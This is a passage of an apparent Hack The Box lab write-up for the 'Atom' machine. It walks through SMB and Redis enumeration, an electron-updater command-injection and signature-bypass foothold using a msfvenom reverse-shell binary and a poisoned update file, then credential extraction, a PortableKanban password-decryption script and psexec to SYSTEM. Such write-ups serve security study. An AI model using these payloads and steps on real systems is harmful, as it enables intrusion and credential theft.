</span></span><span class="line"><span class="cl">Host is up, received echo-reply ttl <span class="m">127</span> <span class="o">(</span>0.051s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">65529</span> filtered ports
</span></span><span class="line"><span class="cl">Reason: <span class="m">65529</span> no-responses
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE      REASON          VERSION
</span></span><span class="line"><span class="cl">80/tcp   open  http         syn-ack ttl <span class="m">127</span> Apache httpd 2.4.46 <span class="o">((</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27<span class="o">)</span>
</span></span><span class="line"><span class="cl">135/tcp  open  msrpc        syn-ack ttl <span class="m">127</span> Microsoft Windows RPC
</span></span><span class="line"><span class="cl">443/tcp  open  ssl/http     syn-ack ttl <span class="m">127</span> Apache httpd 2.4.46 <span class="o">((</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27<span class="o">)</span>
</span></span><span class="line"><span class="cl">445/tcp  open  microsoft-ds syn-ack ttl <span class="m">127</span> Microsoft Windows <span class="m">7</span> - <span class="m">10</span> microsoft-ds <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
</span></span><span class="line"><span class="cl">5985/tcp open  http         syn-ack ttl <span class="m">127</span> Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
</span></span><span class="line"><span class="cl">6379/tcp open  redis        syn-ack ttl <span class="m">127</span> Redis key-value store
</span></span><span class="line"><span class="cl">Service Info: Host: ATOM<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 153.92 seconds
</span></span></code></pre></div><p>A script scan doesn&rsquo;t really helpful, so I&rsquo;ll skip that here.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-6379---redis">TCP 6379 - Redis</h3>
<p>On Redis, authenticated is required.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «smb» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ nc -nv 10.10.10.237 <span class="m">6379</span>
</span></span><span class="line"><span class="cl"><span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.237<span class="o">]</span> <span class="m">6379</span> <span class="o">(</span>?<span class="o">)</span> open
</span></span><span class="line"><span class="cl">INFO
</span></span><span class="line"><span class="cl">-NOAUTH Authentication required.
</span></span></code></pre></div><h3 id="tcp-445---smb">TCP 445 - SMB</h3>
<p>SMB enumeration with Anonymous logon using <code>crackmapexec</code> reveals the Windows version and one writable share.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «atom» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ crackmapexec smb 10.10.10.237 -u <span class="s1">&#39;ANONYMOUS&#39;</span> -p <span class="s1">&#39;&#39;</span> --shares
</span></span><span class="line"><span class="cl">SMB         10.10.10.237    <span class="m">445</span>    ATOM             <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> Pro <span class="m">19042</span> x64 <span class="o">(</span>name:ATOM<span class="o">)</span> <span class="o">(</span>domain:ATOM<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
</span></span><span class="line"><span class="cl">SMB         10.10.10.237    <span class="m">445</span>    ATOM             <span class="o">[</span>+<span class="o">]</span> ATOM<span class="se">\A</span>NONYMOUS: 
</span></span><span class="line"><span class="cl">SMB         10.10.10.237    <span class="m">445</span>    ATOM             <span class="o">[</span>+<span class="o">]</span> Enumerated shares
</span></span><span class="line"><span class="cl">SMB         10.10.10.237    <span class="m">445</span>    ATOM             Share           Permissions     Remark
</span></span><span class="line"><span class="cl">SMB         10.10.10.237    <span class="m">445</span>    ATOM             -----           -----------     ------
</span></span><span class="line"><span class="cl">SMB         10.10.10.237    <span class="m">445</span>    ATOM             ADMIN$                          Remote Admin
</span></span><span class="line"><span class="cl">SMB         10.10.10.237    <span class="m">445</span>    ATOM             C$                              Default share
</span></span><span class="line"><span class="cl">SMB         10.10.10.237    <span class="m">445</span>    ATOM             IPC$                            Remote IPC
</span></span><span class="line"><span class="cl">SMB         10.10.10.237    <span class="m">445</span>    ATOM             Software_Updates READ,WRITE      
</span></span></code></pre></div><h4 id="software_updates-share">Software_Updates Share</h4>
<p>In <code>Software_Updates</code>, there is a PDF file called <code>UAT_Testing_Procedures.pdf</code>. I&rsquo;ll grab that file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «atom» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ smbclient -N //10.10.10.237/Software_Updates
</span></span><span class="line"><span class="cl">Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> dir
</span></span><span class="line"><span class="cl">  .                                   D        <span class="m">0</span>  Mon May <span class="m">17</span> 08:05:58 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">  ..                                  D        <span class="m">0</span>  Mon May <span class="m">17</span> 08:05:58 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">  client1                             D        <span class="m">0</span>  Mon May <span class="m">17</span> 08:05:58 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">  client2                             D        <span class="m">0</span>  Mon May <span class="m">17</span> 08:05:58 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">  client3                             D        <span class="m">0</span>  Mon May <span class="m">17</span> 08:05:58 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">  UAT_Testing_Procedures.pdf          A    <span class="m">35202</span>  Fri Apr  <span class="m">9</span> 07:18:08 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="m">4413951</span> blocks of size 4096. <span class="m">1361569</span> blocks available
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> recurse on
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> prompt off
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> mget *
</span></span><span class="line"><span class="cl">getting file <span class="se">\U</span>AT_Testing_Procedures.pdf of size <span class="m">35202</span> as UAT_Testing_Procedures.pdf <span class="o">(</span>121.5 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 121.5 KiloBytes/sec<span class="o">)</span>
</span></span></code></pre></div><h3 id="tcp-80443---website">TCP 80,443 - Website</h3>
<p>Both port 80 and 443 are display the same site, it&rsquo;s a software company site called &ldquo;Heed Solutions&rdquo;.</p>
<p><div class="img-container"><img src="imgs/image-20210517190515610.png" alt="image-20210517190515610"  /></div>
</p>
<p>At the bottom, there is a hostname and a download link that points to <code>http://10.10.10.237/releases/heed_setup_v1.0.0.zip</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210517190532910.png" alt="image-20210517190532910"  /></div>
</p>
<p>I&rsquo;ll add the hostname to my <code>/etc/hosts</code> file and then download the previous software.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «atom» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.237 atom.htb&#39;</span> &gt;&gt; /etc/hosts
</span></span></code></pre></div><p>After the hostname added, the site still shows the same content.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «atom» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ curl -s -k https://10.10.10.237/ <span class="p">|</span> wc -c
</span></span><span class="line"><span class="cl"><span class="m">7581</span>
</span></span><span class="line"><span class="cl">→ root@kali «atom» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ curl -s -k http://10.10.10.237/ <span class="p">|</span> wc -c 
</span></span><span class="line"><span class="cl"><span class="m">7581</span>
</span></span><span class="line"><span class="cl">→ root@kali «atom» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ curl -s -k http://atom.htb/ <span class="p">|</span> wc -c
</span></span><span class="line"><span class="cl"><span class="m">7581</span>
</span></span><span class="line"><span class="cl">→ root@kali «atom» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ curl -s -k https://atom.htb/ <span class="p">|</span> wc -c
</span></span><span class="line"><span class="cl"><span class="m">7581</span>
</span></span></code></pre></div><h3 id="analysis">Analysis</h3>
<p>The previous zip file contains one executable file called <code>heedv1 Setup 1.0.0.exe</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «loot» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ file heedv1_setup_1.0.0.exe 
</span></span><span class="line"><span class="cl">heedv1_setup_1.0.0.exe: PE32 executable <span class="o">(</span>GUI<span class="o">)</span> Intel 80386, <span class="k">for</span> MS Windows, Nullsoft Installer self-extracting archive
</span></span></code></pre></div><p>It says &ldquo;self-extracting archive&rdquo;, meaning it can be extracted, for example using <code>7z</code>.</p>
<p>While looking into the app structure, I spotted a file called <code>app-update.yml</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «heed_extracted» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ tree
</span></span><span class="line"><span class="cl">.
</span></span><span class="line"><span class="cl">├── <span class="nv">$PLUGINSDIR</span>
</span></span><span class="line"><span class="cl">│   ├── app-64
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">│   │   ├── natives_blob.bin
</span></span><span class="line"><span class="cl">│   │   ├── resources
</span></span><span class="line"><span class="cl">│   │   │   ├── app.asar
</span></span><span class="line"><span class="cl">│   │   │   ├── app-update.yml <span class="c1"># ==&gt; Updater config</span>
</span></span><span class="line"><span class="cl">│   │   │   ├── electron.asar
</span></span><span class="line"><span class="cl">│   │   │   ├── elevate.exe
</span></span><span class="line"><span class="cl">│   │   │   └── inspector
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="m">73</span> directories, <span class="m">274</span> files
</span></span></code></pre></div><p>The file contains another hostname, which I&rsquo;ll add it to <code>/etc/hosts</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «heed_extracted» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ cat ./<span class="se">\$</span>PLUGINSDIR/app-64/resources/app-update.yml
</span></span><span class="line"><span class="cl">provider: generic
</span></span><span class="line"><span class="cl">url: <span class="s1">&#39;http://updates.atom.htb&#39;</span>
</span></span><span class="line"><span class="cl">publisherName:
</span></span><span class="line"><span class="cl">  - HackTheBox
</span></span></code></pre></div><p>And again, it is the same site.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «heed_extracted» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ curl -s http://updates.atom.htb/ <span class="p">|</span> wc -c
</span></span><span class="line"><span class="cl"><span class="m">7581</span>
</span></span></code></pre></div><p>Guessing based on the content of <code>UAT_Testing_Procedures.pdf</code> file from SMB enumeration, <code>heedv1_setup_1.0.0.exe </code> is currently on testing phase. Other information that I can obtain are:</p>
<ul>
<li>The app is packed with electron-builder</li>
<li>The app has auto-update feature, but before releasing the updated app, the QA team will test it first.</li>
</ul>
<p><div class="img-container"><img src="imgs/image-20210517200229002.png" alt="image-20210517200229002"  /></div>
</p>
<p>According to the image above, the <code>client</code> folder here probably refers to the ones on SMB.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-jason">Shell as Jason</h3>
<h4 id="rce-electron-updater---background">RCE Electron-Updater - Background</h4>
<p>I went to the rabbit hole by analyzing the executable file. At first, I thought I could inject the <code>app-update.yml</code> to point to my malicious <code>.exe</code> file and repack the app. I got the idea of poisoning the update file but didn&rsquo;t know where to start until I found this <a href="https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html">blog</a>.</p>
<p>According to that blog, during a software update, previous Electron-Updater uses the following line to perform a signature verification check on the new version of binary file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">execFile(&#34;powershell.exe&#34;, [&#34;-NoProfile&#34;, &#34;-NonInteractive&#34;, &#34;-InputFormat&#34;, &#34;None&#34;, &#34;-Command&#34;, `Get-AuthenticodeSignature &#39;${tempUpdateFile}&#39; | ConvertTo-Json -Compress`], {
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span></code></pre></div><p>If <code>${tempUpdateFile}</code> is a user-controlled input, this can be leveraged for command injection: <code>';calc;'</code></p>
<blockquote>
<p><em>Since the <code>${tempUpdateFile}</code> variable is provided unescaped to the <code>execFile</code> utility, an attacker could bypass the entire signature verification by triggering a parse error in the script.</em></p>
</blockquote>
<p>The following is an example of malicious update definition that will pop a calculator.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">version: 2.0.0
</span></span><span class="line"><span class="cl">path: u&#39;;calc;&#39;pdate.exe
</span></span><span class="line"><span class="cl">sha512: qwP35Rn5PLaBoZ8tzvRFK...&lt;SNIP&gt;...LM3WCmvJUXMYmZGW6T+fI=
</span></span><span class="line"><span class="cl">releaseDate: &#39;2021-01-24T13:44:59.064Z&#39;
</span></span></code></pre></div><p>Sending this <code>u';payload;'pdate.exe</code> as path would be troublesome, which is simplified as follows:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">`Get-AuthenticodeSignature &#39;u&#39;;payload;&#39;pdate.exe&#39; | ConvertTo-Json -Compress`
</span></span></code></pre></div><p>Now that if a single quote <code>'</code> is added to <code>path</code>, it becomes:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">`Get-AuthenticodeSignature &#39;u&#39;pdate.exe&#39; | ConvertTo-Json -Compress`
</span></span></code></pre></div><p>But then, it would breaks the signature verification.  And here&rsquo;s come the interesting part, an attacker could easily bypass this signature verification by recalculating the hash of <code>u'pdate.exe</code>. That&rsquo;s very clever, right?</p>
<h4 id="rce-electron-updater---exploitation">RCE Electron-Updater - Exploitation</h4>
<p>According to the SMB enumeration, all the <code>client</code> folders are writable, which means exploitation can be done in two ways: local and remote. But, I&rsquo;ll go with remote 😅.</p>
<p>First, I&rsquo;ll have to generate a reverse shell binary. This can be done with <code>msfvenom</code>. I&rsquo;ll host this binary using Python web server afterwards.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ msfvenom -p windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.49 <span class="nv">LPORT</span><span class="o">=</span><span class="m">53</span> -f exe -o i<span class="se">\&#39;</span>amf.exe
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x64 from the payload
</span></span><span class="line"><span class="cl">No encoder or badchars specified, outputting raw payload
</span></span><span class="line"><span class="cl">Payload size: <span class="m">460</span> bytes
</span></span><span class="line"><span class="cl">Final size of exe file: <span class="m">7168</span> bytes
</span></span><span class="line"><span class="cl">Saved as: i<span class="err">&#39;</span>amf.exe
</span></span></code></pre></div><p>Next, I&rsquo;ll need to calculate the hash of <code>i'amf.exe</code> using the following command:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ shasum -a <span class="m">512</span> i<span class="se">\&#39;</span>amf.exe <span class="p">|</span> cut -d <span class="s1">&#39; &#39;</span> -f1 <span class="p">|</span> xxd -r -p <span class="p">|</span> base64 <span class="p">|</span> tr -d <span class="s1">&#39;\n&#39;</span>
</span></span><span class="line"><span class="cl">Y4xekmQ80+ALOD0xXBgPdaOmgSsbK8jACQ6xmF4ndoEOvleyI4HRTDniVdExVNryCPWGgxOElKPhMyJCywuLtw<span class="o">==</span>
</span></span></code></pre></div><p>The last thing I need is the update file. I&rsquo;ll create one called <code>update-iamf.yml</code>  which contains the following update definitions:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">version</span><span class="p">:</span><span class="w"> </span><span class="m">2.0.1</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">path</span><span class="p">:</span><span class="w"> </span><span class="l">http://10.10.14.83/i&#39;amf.exe</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">sha512</span><span class="p">:</span><span class="w"> </span><span class="l">Y4xekmQ80+ALOD0xXBgPdaOmgSsbK8jACQ6xmF4ndoEOvleyI4HRTDniVdExVNryCPWGgxOElKPhMyJCywuLtw==</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">releaseDate</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;2021-01-24T13:44:59.064Z&#39;</span><span class="w">
</span></span></span></code></pre></div><p>I&rsquo;ll upload the update file to <code>Software_Updates</code> share using <code>smbclient</code>  and start a netcat listener. After a few minutes, the reverse shell binary connected to my listener.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ smbclient -N //10.10.10.237/Software_Updates -c <span class="s2">&#34;put iamf-update.yml client1/latest.yml&#34;</span>  <span class="o">&amp;&amp;</span> nc -nvlp <span class="m">53</span>
</span></span><span class="line"><span class="cl">putting file iamf-update.yml as <span class="se">\c</span>lient1<span class="se">\l</span>atest.yml <span class="o">(</span>1.1 kb/s<span class="o">)</span> <span class="o">(</span>average 1.1 kb/s<span class="o">)</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.49<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.237<span class="o">]</span> <span class="m">64352</span>
</span></span><span class="line"><span class="cl">Microsoft Windows <span class="o">[</span>Version 10.0.19042.906<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">(</span>c<span class="o">)</span> Microsoft Corporation. All rights reserved.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;whoami
</span></span><span class="line"><span class="cl">whoami
</span></span><span class="line"><span class="cl">atom<span class="se">\j</span>ason
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;
</span></span></code></pre></div><p>User flag is done here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\U</span>sers<span class="se">\j</span>ason<span class="se">\D</span>esktop&gt;type user.txt
</span></span><span class="line"><span class="cl"><span class="nb">type</span> user.txt
</span></span><span class="line"><span class="cl">b77e754354e186f...&lt;SNIP&gt;...
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-system">Shell as SYSTEM</h3>
<h4 id="internal-enumeration">Internal Enumeration</h4>
<p>WinPEAS discovers a set of credentials for user <code>jason</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">[+] Checking Credential manager
</span></span><span class="line"><span class="cl">   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault
</span></span><span class="line"><span class="cl">    [!] Warning: if password contains non-printable characters, it will be printed as unicode base64 encoded string
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">     Username:              ATOM\jason
</span></span><span class="line"><span class="cl">     Password:               kidvscat_electron_@123
</span></span><span class="line"><span class="cl">     Target:                ATOM\jason
</span></span><span class="line"><span class="cl">     PersistenceType:       Enterprise
</span></span><span class="line"><span class="cl">     LastWriteTime:         3/31/2021 2:53:49 AM
</span></span></code></pre></div><p>On Jason&rsquo;s download directory, there is a PortableKanban folder. PortableKanban itself is a password manager. I have familiarity with this application from HTB Sharp. Its config contains an encrypted Redis database password (The clear password revealed in the next section).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">C:\Users\jason\Downloads&gt;type PortableKanban\PortableKanban.cfg
</span></span><span class="line"><span class="cl">type PortableKanban\PortableKanban.cfg
</span></span><span class="line"><span class="cl">{&#34;RoamingSettings&#34;:{&#34;DataSource&#34;:&#34;RedisServer&#34;,&#34;DbServer&#34;:&#34;localhost&#34;,&#34;DbPort&#34;:6379,&#34;DbEncPassword&#34;:&#34;Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb&#34;
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span></code></pre></div><h4 id="redis-revisited">Redis Revisited</h4>
<p>Looking into the Redis installation folder, I find a plain password in <code>redis.windows.conf</code> file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">C:\Program Files\Redis&gt;type redis.windows.conf | findstr requirepass
</span></span><span class="line"><span class="cl">type redis.windows.conf | findstr requirepass
</span></span><span class="line"><span class="cl">requirepass kidvscat_yes_kidvscat
</span></span></code></pre></div><p><code>redis.windows-service.conf</code> also contains the same password.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">C:\Program Files\Redis&gt;type redis.windows-service.conf | findstr requirepass
</span></span><span class="line"><span class="cl">type redis.windows-service.conf | findstr requirepass
</span></span><span class="line"><span class="cl">requirepass kidvscat_yes_kidvscat
</span></span></code></pre></div><p>The password <code>kidvscat_yes_kidvscat</code> works on Redis.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «atom» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ rlwrap nc -nv 10.10.10.237 <span class="m">6379</span>
</span></span><span class="line"><span class="cl"><span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.237<span class="o">]</span> <span class="m">6379</span> <span class="o">(</span>redis<span class="o">)</span> open
</span></span><span class="line"><span class="cl">AUTH jason kidvscat_electron_@123
</span></span><span class="line"><span class="cl">-ERR wrong number of arguments <span class="k">for</span> <span class="s1">&#39;auth&#39;</span> <span class="nb">command</span>
</span></span><span class="line"><span class="cl">AUTH kidvscat_electron_@123
</span></span><span class="line"><span class="cl">-ERR invalid password
</span></span><span class="line"><span class="cl">AUTH kidvscat_yes_kidvscat
</span></span><span class="line"><span class="cl">+OK
</span></span></code></pre></div><p>It&rsquo;s possible to dump the database that is currently in use.</p>
<p>To do that, I&rsquo;ll send <code>INFO</code> command and starting to look for a chunk called <code>Keyspace</code> .</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">INFO
</span></span><span class="line"><span class="cl">$1938
</span></span><span class="line"><span class="cl"># Server
</span></span><span class="line"><span class="cl">redis_version:3.0.504
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl"># Keyspace
</span></span><span class="line"><span class="cl">db0:keys=4,expires=0,avg_ttl=0
</span></span></code></pre></div><p>There is one database active, which is <code>db0</code> and it contains 4 keys.</p>
<p>I&rsquo;ll send <code>KEYS *</code> command to get all the stored keys.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">SELECT 0
</span></span><span class="line"><span class="cl">+OK
</span></span><span class="line"><span class="cl">KEYS *
</span></span><span class="line"><span class="cl">*4
</span></span><span class="line"><span class="cl">$48
</span></span><span class="line"><span class="cl">pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0
</span></span><span class="line"><span class="cl">$11
</span></span><span class="line"><span class="cl">pk:ids:User
</span></span><span class="line"><span class="cl">$20
</span></span><span class="line"><span class="cl">pk:ids:MetaDataClass
</span></span><span class="line"><span class="cl">$57
</span></span><span class="line"><span class="cl">pk:urn:metadataclass:ffffffff-ffff-ffff-ffff-ffffffffffff
</span></span></code></pre></div><p>The value of <code>pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0</code> contains a credentials of the Administrator account, but the password is encrypted.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">GET pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0
</span></span><span class="line"><span class="cl">$207
</span></span><span class="line"><span class="cl">{&#34;Id&#34;:&#34;e8e29158d70d44b1a1ba4949d52790a0&#34;,&#34;Name&#34;:&#34;Administrator&#34;,&#34;Initials&#34;:&#34;&#34;,&#34;Email&#34;:&#34;&#34;,&#34;EncryptedPassword&#34;:&#34;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi&#34;,&#34;Role&#34;:&#34;Admin&#34;,&#34;Inactive&#34;:false,&#34;TimeStamp&#34;:637530169606440253}
</span></span></code></pre></div><h4 id="portablekanban-decrypt">PortableKanban Decrypt</h4>
<p>By assuming that the password is encrypted using PortableKanban, I could try to decrypt the password I obtained using the following <a href="https://github.com/fahmifj/PortableKanban-decrypt/blob/main/pk-decrypt.py">script</a>  (a modified version of the original exploit).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">from base64 import b64decode
</span></span><span class="line"><span class="cl">import sys
</span></span><span class="line"><span class="cl">import des 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">key</span> <span class="o">=</span> des.DesKey<span class="o">(</span>b<span class="s1">&#39;7ly6UznJ&#39;</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">iv</span> <span class="o">=</span> b<span class="s1">&#39;XuVUm5fR&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">try:    
</span></span><span class="line"><span class="cl">	<span class="nv">passwd</span> <span class="o">=</span> b64decode<span class="o">(</span>sys.argv<span class="o">[</span>1<span class="o">]</span>.encode<span class="o">(</span><span class="s1">&#39;UTF-8&#39;</span><span class="o">))</span>
</span></span><span class="line"><span class="cl">except IndexError:
</span></span><span class="line"><span class="cl">	print<span class="o">(</span><span class="s1">&#39;[-] Usage: %s &lt;base64_encrypted_passwd&gt;&#39;</span> % sys.argv<span class="o">[</span>0<span class="o">])</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">	sys.exit<span class="o">(</span>-1<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">dec_password</span> <span class="o">=</span> key.decrypt<span class="o">(</span>passwd, <span class="nv">initial</span><span class="o">=</span>iv, <span class="nv">padding</span><span class="o">=</span>True<span class="o">)</span>
</span></span><span class="line"><span class="cl">print<span class="o">(</span><span class="s2">&#34;[+] Decrypted Password: &#34;</span> + dec_password.decode<span class="o">(</span><span class="s1">&#39;UTF-8&#39;</span><span class="o">))</span>
</span></span></code></pre></div><p>The administrator password has been decrypted to <code>kidvscat_admin_@123</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «atom» «10.10.14.83»
</span></span><span class="line"><span class="cl">$ python3 pk-decrypt.py Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Decrypted Password: kidvscat_admin_@123
</span></span></code></pre></div><h4 id="psexecpy">psexec.py</h4>
<p>I could use the credentials in psexec from impacket to obtain interactive shell access as system.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «atom» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ impacket-psexec atom/administrator:<span class="s1">&#39;kidvscat_admin_@123&#39;</span>@10.10.10.237
</span></span><span class="line"><span class="cl">Impacket v0.9.22 - Copyright <span class="m">2020</span> SecureAuth Corporation
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Requesting shares on 10.10.10.237.....
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found writable share ADMIN$
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Uploading file FCSITnEj.exe
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Opening SVCManager on 10.10.10.237.....
